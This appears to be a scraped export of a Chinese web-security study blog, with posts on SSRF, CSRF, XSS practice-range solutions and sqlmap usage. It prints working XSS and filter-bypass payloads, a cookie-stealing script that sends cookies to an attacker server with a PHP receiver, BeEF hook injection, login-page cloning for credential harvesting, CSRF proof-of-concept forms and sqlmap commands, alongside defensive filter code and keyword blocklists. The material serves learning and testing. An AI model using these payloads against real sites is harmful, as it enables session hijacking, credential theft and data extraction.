服务端提供了从其他服务器获取数据的功能，但没有对内网目标地址做过滤与限制 主要方式： 1、对外网、服务器所在内网、本地进行端口扫描，获取Banner信息。 2、测试运行在内网或本地的应用程序。 3、利用file协议读取本地文件等。","categories":[{"name":"web安全","slug":"web安全","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[]},{"title":"CSRF漏洞","slug":"CSRF漏洞","date":"2019-08-14T00:36:04.000Z","updated":"2020-05-10T10:03:28.906Z","comments":true,"path":"categories/web安全/CSRF漏洞/","link":"","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/CSRF%E6%BC%8F%E6%B4%9E/","excerpt":"CSRF（Cross-site request forery,跨站请求伪造）也被称为One Click Attack或者Session Riding ,通常缩写为CSRF或者XSRF","text":"CSRF（Cross-site request forery,跨站请求伪造）也被称为One Click Attack或者Session Riding ,通常缩写为CSRF或者XSRF csrf本质原因：重要操作的所有参数都是被被恶意攻击者猜测到的。 原理：利用目标用户的合法身份，忽悠目标用户点击链接，完成某些非法操作 典型例子：QQ空间自动转发说说 防御： 验证http referer字段 在请求地址中添加token，并验证 在http头中自定属性并验证 无防护的csrf漏洞get型csrf利用： 1&lt;img src=\"https://target.php?uname=123 passworld=123\"&gt; postcsrf利用：设置form表单提交 1&lt;input type=\"hidden\" name=\"username\" value=\"1111\"/&gt; 自动化探测burp探测特征： 重放请求，无一次性token或验证码 referer去掉后重放请求，无referer验证 去掉token后重放，后端认证机制薄弱 CSRFTester探测代理抓取链接和表单信息通过在工具中修改，再重新提交，如果测试的请求被网站服务器所接受，那么存在csrf漏洞。 步骤： 1.设置浏览器代理:127.0.0.1:8008 2.登录web应用程序，提交表单，在csrf工具中修改表单内容，查看是否更改，如更改表面存在csrf漏洞。 3.生产poc（观点验证程序）代码。 漏洞利用漏洞实质是服务器无法判断当前请求是否是合法账户的自定义请求。 使用服务器搭建csrf poc访问页面，在kali中,/var/www/html,下的index.html要被替换为工具生成的index.html（或者用一个站点的页面嵌入poc代码） ，修改一下ip,类似下面这句 1&lt;form method=\"POST\" name=\"form10\" action=\"http://127.0.0.1:80/espcms/espcms_admin/index.php?act=tExyZnjRRCSmgu2bgcaOZesWvaDlNc6yRugESP1ac3Y=\"&gt; 127.0.0.1改为目标站点地址，在合法用户登录后并点击了该链接，即可达成攻击目的。 token防御用户登录后，服务器会发给用户一个唯一的合法令牌，会随用户form表单中的value隐藏提交。 登录验证成功后，再会话session[“user_token”]中保存token。 在后台操作中，增删改表单中添加隐藏域hidden，设置value为token。 提交之后进行验证token是否正确。 防御措施 生成一个随机且不被轻易猜测的参数。 token泄露 get型token泄露：页面包含 1&lt;img src=\"\"&gt; 那么请求中的referer就会携带对应的get token. post型token泄露： 利用xss漏洞读取cookie,获取讯处在其中的token值。 referer防御referer用来告诉服务器该请求来自哪个页面。 代码编写：绕过技巧：创建一个带目标服务器的ip的目录burp自动生成poc:pro get型利用链接利用：a 1&lt;a href=\"\"&gt; iframe利用： 1&lt;iframe src=\"\" style=\"display:none\"&gt; img标签利用： 1&lt;img src=\"\"&gt; css中background利用： 1&lt;h1 style=\"background:url()\"&gt; 验证码防御并不能每部 都用验证码，并不是主要防御方法。 referer check防御主要用于防止盗链，同理也可以用于检查请求是否来自合法的源 缺陷：不是任何时候都会携带referer头，如https转http","categories":[{"name":"web安全","slug":"web安全","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"CSRF","slug":"CSRF","permalink":"https://lacc233.github.io/tags/CSRF/"}]},{"title":"xss跨站脚本攻击","slug":"xss跨站脚本攻击","date":"2019-08-04T01:19:47.000Z","updated":"2020-05-10T00:55:08.389Z","comments":true,"path":"categories/web安全/xss跨站脚本攻击/","link":"","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/","excerpt":"xss学习记录","text":"xss学习记录 介绍跨站脚本攻击（Cross Site Scripting）为了不和层叠样式表（CSS）混淆，故缩写为XSS；攻击者在web页面内插入恶意java script 代码，当用户浏览该页面时，恶意代码（js）会被执行，即达到攻击目的。 分类反射型XSS又称非持久性XSS，具有一次性。攻击者通过邮件等形式将包含xss代码的链接发送给正常用户，当用户点击时，服务器接受该用户的请求并进行处理，然后把带有xss的代码发送给用户，用户浏览器解析执行代码，触发xss漏洞。 存储型XSS又称持久型XSS，攻击脚本存储在目标服务器的数据库中，具有更强的隐蔽性。攻击者在论坛上，博客，留言板中，发帖的过程中嵌入XSS攻击代码，帖子被目标服务器存储在数据库中。当用户进行正常访问时，触发XSS代码。 DOM型XSSDOM型XSS全称Document Object Model，使用DOM动态访问更新文档的内容，结构及样式。服务器响应不会处理攻击者脚本，而是用户浏览器处理这个响应时，DOM对象就会 处理XSS代码，触发XSS漏洞。 盗取cookiecookie介绍某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据（通常经过加密） 在http协议下，服务器或脚本可以维护客户工作站上信息的一种方式。cookie是由web服务器保存在用户浏览器（客户端）上的小文本文件，它可包含有关用户的信息 目前cookie有临时的也有持续的，临时的只在浏览器上保存一段时间，超过规定时间，该cookie会被系统清除。 服务器可以利用cookie包含信息的任意性来筛选或经常性维护这些信息，以判断在http传输中的状态。 典型应用为判断注册用户是否已经登录网站；提示用户是否保存账号，保留用户信息，简化下次登录；购物车结账（在不同页面下选择的同一家的商品）信息都会写入到cookies。 反射xss盗取cookie1url?uname=&lt;script&gt;document.location='http://ip/xss_test/cookie.php?cookie='+document.cookie&lt;/script&gt; 将连接发送到用户，用户点击即触发XSS漏洞，同时可以使用URL编码迷惑用户。 cookie.php代码： 1234&lt;?php$cookie=$_GET['cookie'];file_put_contents('cookie.txt',$cookie);?&gt; cookie 接受cookie参数，写入到cookie.txt 利用cookie会话劫持burp登录界面修改cookie，成功登录 劫持会话后的操作 1.修改配置文件 2.上传webshell 篡改网页链接js代码讲解1234567&lt;script&gt;window.onload=function()&#123;var link=document.getElementsByTagName(\"a\");for(j=0;j&lt;link.length;j++)&#123; link[j].href=\"http://attacker-site.com/\";&#125;&#125;&lt;/script&gt; window.onload 当窗口加载时，执行匿名函数。使用for循环遍历所有获得的连接a标签 xss篡改链接在xss位置输入上面代码 篡改链接指向流量url刷流量，上述代码修改url 篡改链接指向恶意urlbeef 进行恶意链接生成，以及利用hook.js执行其他命令。kali中终端输入beef-xss启动beef并生成恶意链接, 开启一个服务器( service apache2 start )，将下面代码写入到代码（/var/www/index.html）当中 1&lt;script src=\"http://ip[:port]/hook.js\"&gt;&lt;/script&gt; 最后修改url至攻击者的服务器页面，点击即触发。 盗取用户信息盗取用户信息原理克隆网站登录界面，利用存储xss设置跳转代码，如果用户访问即跳转到克隆的登录页面，用户输入登录，账号密码被存储。 12345graph TDA[用户] --&gt; |访问| B[原始站点有存xss漏洞]B --&gt; |跳转| C[克隆站点]A --&gt; |输入账号密码|CC--&gt;|用户输入账号密码|D(成功获取并存储) setoolkit工具克隆网站万能的社工工具Select from the menu: 从菜单中选择: 1) Social-Engineering Attacks 社会工程学攻击 2) Penetration Testing (Fast-Track) 穿透测试(快速通道) 3) Third Party Modules 第三方模块 4) Update the Social-Engineer Toolkit 更新社交工程师工具包 5) Update SET configuration 更新集合配置 6) Help, Credits, and About 帮助，学分，等等 选中1 1) Spear-Phishing Attack Vectors 鱼叉式钓鱼攻击载体 2) Website Attack Vectors 网站攻击载体 3) Infectious Media Generator 感染介质发生器 4) Create a Payload and Listener 创建一个有效负载和侦听器 5) Mass Mailer Attack 大规模邮件攻击 6) Arduino-Based Attack Vector 基于arduino的攻击向量 7) Wireless Access Point Attack Vector 无线接入点攻击向量 8) QRCode Generator Attack Vector QRCode生成器攻击向量 9) Powershell Attack Vectors Powershell攻击向量 10) Third Party Modules 第三方模块 选中2 1) Java Applet Attack Method Java Applet攻击方法 2) Metasploit Browser Exploit Method Metasploit浏览器利用方法 3) Credential Harvester Attack Method 凭证收割机攻击方法 4) Tabnabbing Attack Method 制表攻击法 5) Web Jacking Attack Method 顶网攻击方法 6) Multi-Attack Web Method 多攻击Web方法 7) HTA Attack Method HTA攻击方法 选中3 1) Web Templates 网页模板 2) Site Cloner 现场切割 3) Custom Import 自定义导入 选中2 Enter the IP address for POST back in Harvester/Tabnabbing: (默认会使用网卡上的地址)Enter the url to clone:输入要克隆的站点url 存储xss跳转克隆网站xss payload: 1&lt;script&gt;window.location=\"http://ip/\"&lt;/script&gt; 查看盗取账号和密码在setoolkit终端中查看账号密码 没有过滤的xss实验环境介绍一个日本安全研究员制作的xss练习靶场https://xss-quiz.int21h.jp/在IE浏览器中打开 闭合文本标签利用xss打开审查工具，查看代码 stage #1 http://xss-quiz.int21h.jp/ 简单payload： 1&lt;script&gt;alert(document.domain);&lt;/script&gt; 闭合payload: 1\"&lt;/b&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt; 属性中的xss配置chrome关闭xss-auditor右键Chrome快捷方式，选择属性，复制文件位置，创建快捷方式，粘贴，并在后面加上--args --disable-xss-auditor ,最后给快捷方式命名，完成。 之后就不用IE了，改用Chrome。 属性中xss发现Ctrl+f代码审查 stage #2 http://xss-quiz.int21h.jp/stage2.php?sid=106cdb0a46450efb744850a579323ac9103d907c 属性中xss闭合引入script 1\"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt; 属性中xss闭合引入事件 1\" onmouseover=alert(document.domain);&gt; 选择列表中的xsshtml select 标签介绍123&lt;select&gt;&lt;option&gt;name&lt;/option&gt;&lt;/select&gt; 表单介绍html表单用于搜集不同类型的用户输入 1&lt;form action=\"?sid=...\" method=\"post\"&gt;&lt;/form&gt; burp测试 stage #3 http://xss-quiz.int21h.jp/stage-3.php?sid=d830eb35fde6abc802cb930e5ba1b2adaaf6680d 抓取，p2储存在漏洞payload: 1p2=japan&lt;script&gt;alert(document.domain);&lt;/script&gt; 选择参数中的xsshtml表单隐藏参数介绍1&lt;input type=\"hidden\" name=\"...\" value=\"...\"&gt; html中svg介绍svg：意为可缩放的矢量图形，使用xml格式定义图像可通过以下标签嵌入html文档：&lt;wmbed&gt;,&lt;object&gt;或者&lt;iframe&gt;，也可以使用&lt;svg&gt;标签嵌入 12&lt;svg/事件=\"\"&gt;&lt;svg/onload=alert(document.domain)&gt;%0a 闭合触发xss stage #4 http://xss-quiz.int21h.jp/stage_4.php?sid=9fb2ab3ae196c1fb05d9157d3d5f6c91b2b4398c payload: 1\"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt; 限制输入长度的xsshtml 表单文本框介绍html表单用于搜集不同类型的用户输入；表单元素指的是不同类型的input元素、复选框、单选按钮、提交按钮等等；这里介绍text定义常规文本输入。 属性介绍： value 规定输入字段的初始值 readonly 规定输入字段为只读 disabled 规定输入字段是禁用的。被禁用的元素不可用，不可点击，不会提交。 size 规定输入字段的字符 maxlength 规定输入字段允许的最大长度 xss payload长度计算利用python len函数,如下，结果为40字符 12&gt;&gt;&gt; payload = \"&lt;script&gt;alert(document.domain);&lt;/script&gt;\"&gt;&gt;&gt; len(payload) 浏览器审查工具修改源码 stage #5 http://xss-quiz.int21h.jp/stage--5.php?sid=2d4972900f3da3e4e8dd3bb442c5e59402ede268 paylaod: 先修改maxlength 1\"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt; payload 触发xss漏洞随着安全意识的提高，script可能会被过滤 1\"&gt;&lt;svg/onload=alert(document.domaim)&gt;%0a 1111\" onmouseover=\"alert(document.domain)\" html事件中的xsshtml事件介绍在现代浏览器中内置有大量的事件处理器，监事特定的条件或用户行为，例如鼠标点击（onclick）或浏览器窗口完成加载某个图像（onload）。通过使用客户端的js,可以将某些特定的事件处理器作为属性添加给特定的标签，并可以在事件发生时执行一个或多个javascript命令或函数 xss漏洞发现 stage #6 http://xss-quiz.int21h.jp/stage-no6.php?sid=60b74c922558e644330a8769788ef25dae80d8e0 审查代码 1&lt;input type=\"text\" name=\"p1\" size=\"50\" value+\"132456\"&gt; 闭合思路分析1\"onmouseover=\"alert(document.domain) 1\"&gt;&lt;svg/onload=alert(document.domain)&gt;%0a payload触发xss漏洞1\" onclick=\"alert(document.domain) 空格分隔属性的xssxss探测 stage #7 http://xss-quiz.int21h.jp/stage07.php?sid=c702ac5f967df2831c3920c1aa3100af0b3e5aa8 触发xss1123 onmouseover=alert(document.domain) javascript伪协议的xssjavascript伪协议介绍将js 代码添加到客户端，方法是把它放置在伪协议说明符javascript:后的url中。 他声明了url的主题是任意javascript，它由javascript的解释器运行，若果javascript:url中的js代码含有多个语句，必须要用;讲这些语句分隔开 1javascript:var now = now Data();\"&lt;h1&gt;this item&lt;/h1&gt;\" + now; js 还可以只含有动作，但不返回值得js语句 1javascript:alert(\"hello world\") xss漏洞发现并触发 设置第一无二字符串提交，在响应中寻找。 stage #8 http://xss-quiz.int21h.jp/stage008.php?sid=b23793aaeaad16b5faa949a246a1316e9cf24917 1javascript:alert(document.domain) 1&lt;a href=\"javascript:alert(document.domain)\"&gt;javascript:alert(document.domain)&lt;/a&gt; utf-7 xss stage #9 http://xss-quiz.int21h.jp/stage_09.php?sid=7e3613202c0e7cc4ed129d4c60b98dbe887aa456 这里的utf-7 现在的浏览器已经移除了这种编码，危害较小 所以这里取巧： 或者 点击跳过这关 绕过过滤domain为空的xss stage #10 http://xss-quiz.int21h.jp/stage00010.php?sid=b86e436416bd0ed72ba8e07ffd237471e7bd006d domain被过滤，采取双写，编码绕过 双写： 1132456\"&gt;&lt;svg/onload=alert(document.domdomainain)&gt;%0a 这里使用base64编绕过，也可以采用其他 1132456\"&gt;&lt;script&gt;eval(atob(\"YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==\"));&lt;/script&gt; 绕过替换script和on事件的xss stage #11 https://xss-quiz.int21h.jp/stage11th.php?sid=53f688b9e3f5640b32d4096f5b0b5e4f193e5b4a 在伪协议中带空格仍然能执行 1132456\"&gt;&lt;a href=\"javasc ript:alert(document.domain);\"&gt;xss&lt;/a&gt; 然而，404,空格换一下在script中间插入&amp;#09;，&amp;#10;，空格等不可见字符，让正则匹配不到。 1123\"&gt;&lt;a href=\"javasc&amp;#10;ript:alert(document.domain);\"&gt;xss&lt;/a&gt; IE特性绕过xss过滤 stage #12 https://xss-quiz.int21h.jp/stage_no012.php?sid=6bd3fefa2774a7d333026335d5f24239d7ebb75b 这里过滤了&lt;,”,ie,有一特性 两个 ` 号 可闭合 “ 1`` onmouseover=alert(document.domain) css 特性绕过xss过滤 stage #13 https://xss-quiz.int21h.jp/stage13_0.php?sid=6c076a83715f2f3d68d7fa96051c8cba0d5528b2 同样是在ie中，css特性： ;background:url(&quot;javascript:alert(document.dmain);&quot;) 1background-color:salmon;background:url(\"javascript:alert(document.domain);\") css触发xsscss介绍层叠样式表是一种用来表现html或xml等文件样式的计算机语言。css不仅可以静态的修饰网页，还可以配合各种脚本语言动态的对网页各元素进行格式化。 css中执行jscss expression(css 表达式)又称Dymamic properties(动态属性)是早期微软DHTML的产物，以其可以在css中定义表达式（公式）来达到建立元素间属性之间的联系等作用，从IE5开始得到支持，后因标准、性能、安全性等问题、微软IE8 bate2标准模式开始，取消对css expression的支持。（实际应用：导航栏，返回顶部） 注释绕过关键字过滤 stage #14 https://xss-quiz.int21h.jp/stage-_-14.php?sid=eb2573e964a61b65bc4d456c9fae630ac19266c2 /**/ 1xss:expres/**/sion(if(!window.x)&#123;alert(document.domain);window.x=1;&#125;) 16进制绕过过滤触发xss符号 -&gt; 16 12&gt;&gt;&gt; import binascii&gt;&gt;&gt; print \"\\\\x\"+binascii.b2a_hex(\"&lt;\") 带上\\x,js 可识别 stage #15 https://xss-quiz.int21h.jp/stage__15.php?sid=e4954d390fd0e5d6a8dd4d1f3647e7f4095bcf2e 经检测，&lt; &gt; \\ 被过滤，&lt; 16进制为3c &gt;16进制为3e 1\\\\x3cscript\\\\x3ealert(document.domain);\\\\x3c/script\\\\x3e Ascii绕过过滤触发xss符号 -&gt; ascii 12&gt;&gt;&gt; import binascii&gt;&gt;&gt; print \"\\\\u00\" + binascii.b2a_hex(\"&lt;\") stage #16 https://xss-quiz.int21h.jp/stage00000016.php?sid=5286887e32a1526dc007701ca9e159eed22b992e 1\\\\u003cscript\\\\u003ealert(document.domain);\\\\u003c/script\\\\u003e 源源：由协议，主机名，端口名组成（例：协议://主机名:端口号/） 同源策略（SOP）：用于阻止一个非同源的页面恶意代码去访问另外一个非同源页面 ie的特殊处理1.位于可信域的互信的域名间，不受同源策略限制 2.ie在判断同源时不考虑端口 document.domain可通过document.domain读取或修改源；但有限制，修改之后的源不能通过其他脚本再次修改。 domain属性可以解决因同源安全策略带来的不同文档的属性共享问题 降域 document.domain,同源策略认为域和子域属于不同的域，如child.a.com 与 a.ocm,child2.a.com与child1.a.com,两两不同源，可设置document.domain=”a.com”,就同源了；想要设置以上任意两个页面通信 ，两个页面都必须设置document.domain=”a.com”。 cookie的httponly设置消除cookie：Internet选项，常规 cookie httponlysetcookie(“abc”,”test”,NULL,NULL,NULL,NULL,TRUE);设置secure参数为true之后，就不能使用js获取cookie setcookie(name(必须。规定名称),value(必须，规定值),expire(有效期),path(服务器路径),domain( 域名),secure(是否通过安全的https连接来传输cookie),httponly) 在本地实验： tescookie.php 12345678&lt;?php setcookie(\"user\",\"admin\",NULL,NULL,NULL,NULL,FALSE); setcookie(\"pass\",\"admin\",NULL,NULL,NULL,NULL,TRUE); $id = $_GET[\"id\"]; echo $id;?&gt; 1http:&#x2F;&#x2F;127.0.0.1&#x2F;testcookie.php?id&#x3D;%3Cscript%3Edocument.write(document.cookie);%3C&#x2F;script%3E 就会输出 user=admin，TRUE的pass就不会输出。 xss-filter 过滤器防御函数htmlspecialchars()函数 把预定义的字符转换为html实体 1htmlspecialchars(string,flags,character-set,double_encode) htmlentities()函数 过滤用户输入的数据，将一些特殊字符串转换为html实体。 1htmlentities(string,flags,character-set,double_encode) strip_tags()函数 剥去字符串中得html、xml以及php的标签。 该函数会剥离html注释，这点无法通过allow参数改变。 该函数是二进制安全的。 1strip_tags(string,allow) 自定义xss filter 法一 12345678910111213141516171819202122232425function xss_clean($data)&#123; // Fix &amp;entity＼n; $data=str_replace(array('&amp;','&lt;','&gt;'),array('&amp;amp;','&amp;lt;','&amp;gt;'),$data); $data=preg_replace('/(&amp;#*＼w+)[＼x00-＼x20]+;/u','$1;',$data); $data=preg_replace('/(&amp;#x*[0-9A-F]+);*/iu','$1;',$data); $data=html_entity_decode($data,ENT_COMPAT,'UTF-8'); // Remove any attribute starting with \"on\" or xmlns $data=preg_replace('#(&lt;[^&gt;]+?[＼x00-＼x20\"＼'])(?:on|xmlns)[^&gt;]*+&gt;#iu','$1&gt;',$data); // Remove javascript: and vbscript: protocols $data=preg_replace('#([a-z]*)[＼x00-＼x20]*=[＼x00-＼x20]*([`＼'\"]*)[＼x00-＼x20]*j[＼x00-＼x20]*a[＼x00-＼x20]*v[＼x00-＼x20]*a[＼x00-＼x20]*s[＼x00-＼x20]*c[＼x00-＼x20]*r[＼x00-＼x20]*i[＼x00-＼x20]*p[＼x00-＼x20]*t[＼x00-＼x20]*:#iu','$1=$2nojavascript...',$data); $data=preg_replace('#([a-z]*)[＼x00-＼x20]*=([＼'\"]*)[＼x00-＼x20]*v[＼x00-＼x20]*b[＼x00-＼x20]*s[＼x00-＼x20]*c[＼x00-＼x20]*r[＼x00-＼x20]*i[＼x00-＼x20]*p[＼x00-＼x20]*t[＼x00-＼x20]*:#iu','$1=$2novbscript...',$data); $data=preg_replace('#([a-z]*)[＼x00-＼x20]*=([＼'\"]*)[＼x00-＼x20]*-moz-binding[＼x00-＼x20]*:#u','$1=$2nomozbinding...',$data); // Only works in IE: &lt;span style=\"width: expression(alert('Ping!'));\"&gt;&lt;/span&gt; $data=preg_replace('#(&lt;[^&gt;]+?)style[＼x00-＼x20]*=[＼x00-＼x20]*[`＼'\"]*.*?expression[＼x00-＼x20]*＼([^&gt;]*+&gt;#i','$1&gt;',$data); $data=preg_replace('#(&lt;[^&gt;]+?)style[＼x00-＼x20]*=[＼x00-＼x20]*[`＼'\"]*.*?behaviour[＼x00-＼x20]*＼([^&gt;]*+&gt;#i','$1&gt;',$data); $data=preg_replace('#(&lt;[^&gt;]+?)style[＼x00-＼x20]*=[＼x00-＼x20]*[`＼'\"]*.*?s[＼x00-＼x20]*c[＼x00-＼x20]*r[＼x00-＼x20]*i[＼x00-＼x20]*p[＼x00-＼x20]*t[＼x00-＼x20]*:*[^&gt;]*+&gt;#iu','$1&gt;',$data); // Remove namespaced elements (we do not need them) $data=preg_replace('#&lt;/*＼w+:＼w[^&gt;]*+&gt;#i','',$data); do&#123;// Remove really unwanted tags $old_data=$data; $data=preg_replace('#&lt;/*(?:applet|b(?:ase|gsound|link)|embed|frame(?:set)?|i(?:frame|layer)|l(?:ayer|ink)|meta|object|s(?:cript|tyle)|title|xml)[^&gt;]*+&gt;#i','',$data); &#125;while($old_data!==$data); // we are done... return $data;&#125; 法二 12345678910111213141516171819202122232425262728293031323334&lt;?php//php防注入和XSS攻击通用过滤.//by qq:831937$_GET &amp;&amp; SafeFilter($_GET);$_POST &amp;&amp; SafeFilter($_POST);$_COOKIE &amp;&amp; SafeFilter($_COOKIE);functionSafeFilter (&amp;$arr)&#123; $ra=Array('/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/','/script/','/javascript/','/vbscript/','/expression/','/applet/','/meta/','/xml/','/blink/','/link/','/style/','/embed/','/object/','/frame/','/layer/','/title/','/bgsound/','/base/','/onload/','/onunload/','/onchange/','/onsubmit/','/onreset/','/onselect/','/onblur/','/onfocus/','/onabort/','/onkeydown/','/onkeypress/','/onkeyup/','/onclick/','/ondblclick/','/onmousedown/','/onmousemove/','/onmouseout/','/onmouseover/','/onmouseup/','/onunload/'); if(is_array($arr)) &#123; foreach($arras$key =&gt; $value) &#123; if(!is_array($value)) &#123; if(!get_magic_quotes_gpc()) //不对magic_quotes_gpc转义过的字符使用addslashes(),避免双重转义。 &#123; $value = addslashes($value); //给单引号（'）、双引号（\"）、反斜线（\\）与 NUL（NULL 字符）加上反斜线转义 &#125; $value = preg_replace($ra,'',$value); //删除非打印字符，粗暴式过滤xss可疑字符串 $arr[$key] = htmlentities(strip_tags($value));//去除 HTML 和 PHP 标记并转换为 HTML 实体 &#125; else &#123; SafeFilter($arr[$key]); &#125; &#125; &#125;&#125;?&gt; 编码转义url编码将不安全的字符编码为安全字符在进行传输（通用得安全字母表） %+两个表示字符ascii的16进制数 html编码一些保留字符出现在文本节点和标签值里不安全，如“&lt;&gt;”会导致刘安琪误以为标签 实体编码 一般&amp;开头，“;”结尾，可不加“；”。如”&lt;”转为”&lt;” 进制编码 以&amp;#开头，加上字符的数值，”;”结尾可不加。字符数值可以是任意十进制ASCII码或Unicode字符编码，十六进制的数值需要在编码数字前加”x“ . js编码\\u +00 + ASCII码 \\x + ASCII码 jsfuck 编码含义攻击绕过 xss过滤器绕过xss payload测试 kali路径：/usr/share/wordlists/wfuzz/Injections/xss.txt 自动化探测，burp:Intruder模块，在positions设置注入位置；在payload中设置payload type为runtime file然后选择对应的xss payload，之后start attack。 关注最新的html等内容 例如更新了新标签，可进行xss测试 参考 ：owasp.org xss发生的位置get型url中的xss如果url修改提交的参数值,在页面显示，很有可能存在(反射)xss post表单中的xss在表单中的提交修改的参数值，在页面中显示，很有可能存在xss form data json中的xssjson(javascript object notation)是一种轻量级的数据交换格式，易于人阅读和编写，同时也易于机器解析和生成，并有效的提升网络传输效率 json 最常见的格式是对象的键值对 闭合前面+;alert(“xss”);//注释后面 自定义http头中的xss如果在http自定义头中提交的参数值，在页面中显示。很有可能存在xss 存储型xss灰盒测试环境搭建PHPstuday:搭建微程序，rocboss 定向xss挖掘:探测漏洞位置，能存储的地方 黑名单审计：查看filter，绕过黑名单 绕过过滤，触发xss：绕过并针对漏洞攻击 自动挖掘工具xsser介绍：针对web应用程序自动化挖掘，利用，报告xss漏洞的框架 原理：不断拼接payload 帮助信息： xsser -h 启动方式： 图像化 xsser- gtk xsstrike stage #17 https://xss-quiz.int21h.jp/stage-No17.php?sid=4f0dacf93ef764da56fd687692abc63e1a31e095","categories":[{"name":"web安全","slug":"web安全","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"xss","slug":"xss","permalink":"https://lacc233.github.io/tags/xss/"}]},{"title":"sqlmap详细使用教程","slug":"sqlmap详细使用教程","date":"2019-07-04T15:34:53.000Z","updated":"2020-06-08T11:53:07.373Z","comments":true,"path":"categories/工具/sqlmap详细使用教程/","link":"","permalink":"https://lacc233.github.io/categories/%E5%B7%A5%E5%85%B7/sqlmap%E8%AF%A6%E7%BB%86%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/","excerpt":"sqlmap： 开源的渗透测工具","text":"sqlmap： 开源的渗透测工具 介绍sqlmap 是开源的渗透测试工具，自动化检测sql注入漏洞，利用其漏洞获取数据库服务器的权限。它的检测引擎功能强大，对于不同类型的数据库的渗透测试，拥有不同的功能选项；既可以获取数据库中存储的数据，又可以访问操作系统文件，甚至可以通过外带数据连接的方式执行操作系统命令。 安装与环境配置sqlmap官网 下载python2.7，安装完成后，配置环境： path内添加python安装路径，例如 D:\\python 环境配置教学 输出详细程度共7级，0到6，默认为1级 0： 仅显示Python追溯，错误和严重消息 1： 还显示信息和警告消息 2： 还显示调试消息 3： 查看工具发送的SQL有效负载 确定探测目标直连数据库-d 数据库类型：文件型数据库（前提是知道数据库绝对路径），关系型数据库（前提是知道数据库用户名和密码） 连接关系型数据库 操作 sqlmap -d “DBMS://User:Password@DBMS_Ip:DBMS_Port/DB_Name” -f –banner -users -d 表示直连 DBMS有mysql,oracle,microsofe sql server,psql,etc… -f fetch 返回 1sqlmap -d \"mysql://root:123456@192.168.1.123:3306/test\" -f --banner --users 连接文件型数据库 操作 同上，DBMS的种类有SQLite,microsofe Access,Firebird,etc… sqlmap -d “DBMS://db_filepath” 1sqlmap -d \"DBMS://db_filepath\" 指定URL-u sqlmap -u “http://targeturl[:port]/[目标文件文件夹]&quot; -u/–url 连接url 1sqlmap -u \"http://www.target.com/index.php?id=1\" --banner 不同类型文件中读取目标-l 从burpsuit proxy或web Scarab proxy中读取Http请求的日志文件 -x 从sitemap.xml站点地图文件中读取目标探测 -m 从多行文本格式文件中读取多个目标，对多个目标进行探测 -r 从文本文件中读取Http请求作为sql注入探测的目标 -c 从配置文件sqlmap.conf 中读取目标探测 google批量扫注入-g sqlmap通过-g自动利用Google hack的目标，然后利用交互向导模式进行sqlmap注入探测 python sqlmap.py -g “inurl:&quot;.php?id=1&quot;“ Google hacking语法 1sqlmap -g \"inurl:.php?id=\" 请求参数设置设置http请求方法--method=PUT 默认为get 设置post参数--data 默认HTTP请求方法为get,但可以隐式的改为post(方法为提供post要发送的数据) 1sqlmap -u \"http://www.target.php?id=1\" --data=\"uname=adnin\" -f --dbs --banner --users -f （fingerprint）指纹 –data=”uname=admin” post 发送的数据 设置参数分隔符--param-del 指定分隔符 默认为“&amp;”做分隔符 在某些情况下，sqlmap需要覆盖默认参数分隔符（例如&amp; in Get和Post数据），才能正确地分割和单独处理每个参数 1sqlmap -u \"www.target.com/culnds.php\" --data=\"query=foobar;id=1\" --param-del=\";\" --banner –param-del=”;”，特殊情况下(其中提交的数据是以“；”号做为分割符，sqlmap 无法识别正误)，指定参数分割，sqlmap才能判断。 设置cookie参数使用场景 web应用程序有基于cookie验证的过程 利用cookie值上的sql注入漏洞 过程 登录/浏览页面（无法登录是无法获取正确cookie值的） 审计工具/代理工具截断，复制cookie 在使用sqlmap 注：对HTTP cookie值进行sql注入探测，需要设置 –level 2以上 1sqlmap -r target.txt --level 2 -p uname --cookie 1sqlmap -u \"http://192.168.127.137/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit\" --cookie \"security=impossible; PHPSESSID=jeadfeijr3rc9sv6fcaib8\" --banner 如果服务器端响应新的cookie值，此时sqlmap 会询问你将要使用哪组cookie --drop-set-cookie 忽略任何即将到来的set-cookie头,仍然使用我们自己设置的cookie值，丢弃服务端响应的cookie值 --load-cookies 可以用来加载一些 Netscape/wget格式的特殊文件的cookie --cookie-del 进行分割的参数 设置user-agent头 默认情况下，sqlmap使用用户代理头，执行HTTP请求：sqlmap/1.0-dev-xxxxxx(http://sqlmap.org) 一些站点在服务端检测HTTP user-agent值，如果不是一个合法的值，就会中断连接，同时sqlmap也会报出错误 --user-agent 用来伪造（自定义）用户代理 --random-agent 会在./txt/user-agent中随机选择一个用于会话中的所有Http请求(usr/share/sqlmap/txt/user-agents.txt) 1sqlmap -u \"...\" --random-agent --banner 1sqlmap -u \"...\" --user-agent=\"Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\" --banner 注： 对user-agent值（*）探测sql注入，需要设置–level 3 设置host头可以手动设置HTTP主机头值，默认情况下，从目标url解析http主机头 注： 对HTTP主机头进行host注入检测，设置level 5 如果在http头内的host,标了“*”，则可不设置level 5 设置referer头伪造http referer 值是可能的，默认情况下，如果没有显式设置，http请求中不会发送http引用头 对于http引用头sql注入测试，应甚至level 3 设置额外的http头--header --headers 提供额外的 http 标头，每个标头必须要用换行符分隔，在sqlmap.conf 配置文件中设置更方便 “\\n”作为–headers的分隔符 设置http协议认证--auth-type 支持Basic,Digest,NTLM --auth-cred 认证语法为： username：password 1sqlmapd -u \"http://url/arit.php?id=1\" --auth-type Basic --auth-cred \"testuser:testpass\" 设置代理--proxy 设置http代理服务器位置,格式：http(s)://ip[:port] --proxy-cred 设置http代理服务器认证信息，格式：–proxy-cred username:password 